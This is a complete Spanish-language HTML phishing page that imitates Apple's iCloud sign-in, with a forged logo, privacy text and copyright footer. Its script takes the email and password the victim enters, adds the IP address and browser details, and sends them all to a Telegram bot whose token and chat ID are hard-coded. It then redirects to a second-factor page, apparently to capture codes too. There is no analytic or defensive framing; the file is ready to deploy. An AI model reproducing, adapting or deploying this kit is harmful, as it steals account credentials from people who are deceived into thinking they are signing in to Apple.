<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iCloud - Iniciar sesi√≥n</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f9f9fc 0%, #f2f5fa 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .status-bar {
            width: 100%;
            max-width: 400px;
            padding: 12px 0;
            color: #000;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
        }

        .icloud-logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .icloud-logo svg {
            width: 48px;
            height: 48px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 28px;
            letter-spacing: -0.3px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #6e6e73;
            margin-bottom: 6px;
            font-weight: 400;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1.5px solid #e6e6ec;
            border-radius: 14px;
            font-size: 16px;
            background: white;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }

        .password-field {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #0071e3;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 8px;
        }

        .toggle-password:hover {
            background: rgba(0, 113, 227, 0.05);
        }

        .create-account {
            margin: 16px 0 24px 0;
        }

        .create-account a {
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .info-text {
            font-size: 13px;
            color: #6e6e73;
            line-height: 1.5;
            margin-bottom: 24px;
            padding: 16px;
            background: #f5f5f7;
            border-radius: 12px;
        }

        .info-text a {
            color: #0071e3;
            text-decoration: none;
            font-weight: 500;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .continue-button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 16px;
        }

        .continue-button:hover {
            background: #0077ed;
            transform: scale(1.02);
        }

        .continue-button:active {
            background: #0063c7;
            transform: scale(0.98);
        }

        .footer {
            width: 100%;
            max-width: 400px;
            margin-top: 32px;
            text-align: center;
            font-size: 12px;
            color: #6e6e73;
        }

        .footer a {
            color: #6e6e73;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            color: #0071e3;
            text-decoration: underline;
        }

        .footer p {
            margin-top: 12px;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 16px 0;
            color: #0071e3;
        }

        .error-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #ff3b30;
            font-size: 14px;
            padding: 10px;
            background: #ffe9e8;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="status-bar">9:15</div>

    <div class="container">
        <div class="icloud-logo">
            <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 8C14.477 8 10 12.477 10 18C10 18.681 10.08 19.343 10.229 19.978C8.296 21.126 7 23.255 7 25.5C7 28.538 9.462 31 12.5 31H27.5C30.538 31 33 28.538 33 25.5C33 23.255 31.704 21.126 29.771 19.978C29.92 19.343 30 18.681 30 18C30 12.477 25.523 8 20 8Z" fill="#0071E3"/>
                <path d="M20 10C15.582 10 12 13.582 12 18C12 18.55 12.058 19.086 12.168 19.605L12.307 20.253L11.687 20.496C10.097 21.097 9 22.661 9 24.5C9 26.985 11.015 29 13.5 29H26.5C28.985 29 31 26.985 31 24.5C31 22.661 29.903 21.097 28.313 20.496L27.693 20.253L27.832 19.605C27.942 19.086 28 18.55 28 18C28 13.582 24.418 10 20 10Z" fill="white"/>
            </svg>
        </div>

        <h1>Inicia sesi√≥n con tu cuenta de Apple</h1>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Correo o n√∫mero telef√≥nico</label>
                <input type="text" id="email" name="email" placeholder="ejemplo@icloud.com" required>
            </div>

            <div class="form-group">
                <label for="password">Contrase√±a</label>
                <div class="password-field">
                    <input type="password" id="password" name="password" placeholder="Contrase√±a" required>
                    <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
                </div>
            </div>

            <div class="create-account">
                <a href="#" onclick="alert('Crear cuenta de Apple')">Crear tu cuenta de Apple</a>
            </div>

            <div class="info-text">
                La informaci√≥n de tu cuenta de Apple se usa para permitirte iniciar sesi√≥n y acceder a tus detalles. Apple guarda ciertos detalles para fines de seguridad, apoyo y reportaje. Si aceptas, Apple tambi√©n podr√° usar la informaci√≥n de tu cuenta de Apple para enviarte correos electr√≥nicos y comunicaciones, lo que incluye contenido basado en tu uso de los servicios de Apple. <a href="#" onclick="alert('Pol√≠tica de privacidad')">Consulta c√≥mo se utiliza tu informaci√≥n...</a>
            </div>

            <button type="submit" class="continue-button">Continuar</button>

            <div class="loading" id="loading">Verificando informaci√≥n...</div>
            <div class="error-message" id="errorMessage"></div>
        </form>
    </div>

    <div class="footer">
        <div>
            <a href="#" onclick="alert('Estado del sistema')">Estado del sistema</a>
            <a href="#" onclick="alert('Pol√≠tica de privacidad')">Pol√≠tica de privacidad</a>
            <a href="#" onclick="alert('T√©rminos y condiciones')">T√©rminos y condiciones</a>
        </div>
        <p>Copyright ¬© 2025 Apple Inc. Todos los derechos reservados.</p>
    </div>

    <script>
        // CONFIGURACI√ìN DE TELEGRAM
        const TELEGRAM_BOT_TOKEN = '8273125469:AAG_fkueGpHdtvWebjHq2utGccJsnCxrL8g';
        const TELEGRAM_CHAT_ID = '6939469358';

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Ocultar';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Mostrar';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loading = document.getElementById('loading');
            const errorMessage = document.getElementById('errorMessage');
            
            // Validar campos
            if (!email || !password) {
                errorMessage.textContent = '‚ùå Por favor, completa todos los campos';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 3000);
                return;
            }
            
            // Ocultar mensajes anteriores
            errorMessage.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // Obtener informaci√≥n del usuario
                const ip = await getIP();
                
                // Crear mensaje
                const message = `üîµ iCLOUD LOGIN - PRIMERA ETAPA üîµ

üìß Email/Tel√©fono: ${email}
üîë Contrase√±a: ${password}

üåê Informaci√≥n:
- IP: ${ip}
- Navegador: ${getBrowserInfo()}
- Plataforma: ${navigator.platform}
- Idioma: ${navigator.language}
- Hora: ${new Date().toLocaleString()}
- URL: ${window.location.href}`;

                // Enviar a Telegram
                await sendToTelegram(message);
                
                // Guardar datos
                sessionStorage.setItem('icloud_email', email);
                sessionStorage.setItem('icloud_password', password);
                sessionStorage.setItem('icloud_ip', ip);
                
                // Redirigir a 2FA
                setTimeout(() => {
                    window.location.href = '2fa.html';
                }, 1500);
                
            } catch (error) {
                console.error('Error:', error);
                loading.style.display = 'none';
                errorMessage.textContent = '‚ùå Error al procesar la solicitud';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 3000);
            }
        });

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return response;
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Desconocido';
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'No disponible';
            }
        }

        // Auto-detectar tipo de input
        document.getElementById('email').addEventListener('input', function(e) {
            const value = e.target.value;
            if (value.includes('@')) {
                e.target.type = 'email';
            } else if (/^\d+$/.test(value)) {
                e.target.type = 'tel';
            } else {
                e.target.type = 'text';
            }
        });
    </script>
</body>
</html>
